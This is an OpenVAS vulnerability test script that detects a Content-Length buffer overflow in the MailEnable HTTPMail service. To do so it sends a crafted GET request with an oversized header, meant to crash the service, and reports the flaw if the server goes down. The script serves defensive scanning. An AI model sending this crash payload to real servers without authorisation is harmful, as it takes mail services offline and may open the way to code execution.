# OpenVAS Vulnerability Test
# $Id: mailenable_httpmail_content_length_overflow.nasl 5390 2017-02-21 18:39:27Z mime $
# Description: MailEnable HTTPMail Service Content-Length Overflow Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server is affected by a buffer overflow vulnerability. 

Description :

The target is running at least one instance of MailEnable that has a
flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and
Enterprise Editions.  The flaw can be exploited by issuing an HTTP GET
with an Content-Length header exceeding 100 bytes, which causes a
fixed-length buffer to overflow, crashing the HTTPMail service and
possibly allowing for arbitrary code execution.";

tag_solution = "Upgrade to MailEnable Professional / Enterprise 1.2 or later or apply
the HTTPMail hotfix from 9th August 2004 found at
http://www.mailenable.com/hotfix/";

if (description) {
  script_id(14655);
  script_version("$Revision: 5390 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_bugtraq_id(10838);
  script_xref(name:"OSVDB", value:"8301");

  name = "MailEnable HTTPMail Service Content-Length Overflow Vulnerability";
  script_name(name);
 
 
  summary = "Checks for Content-Length Overflow Vulnerability in MailEnable HTTPMail Service";
  script_summary(summary);
 
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Web application abuses";
  script_family(family);

  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("MailEnable/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/2004-07/1314.html");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);
if (http_is_dead(port:port)) exit(0);


# Make sure banner's from MailEnable.
banner = get_http_banner(port);
if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
  # Try to bring it down.
  req = string(
    "GET / HTTP/1.0\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Length: ", crap(length:100, data:"9"), "XXXX\r\n",
    "\r\n"
  );
  debug_print("req='", req, "'.\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  debug_print("res='", res, "'.\n");

  # There's a problem if the web server is down.
  if (isnull(res)) {
    if (http_is_dead(port:port)) security_message(port);
  }
}
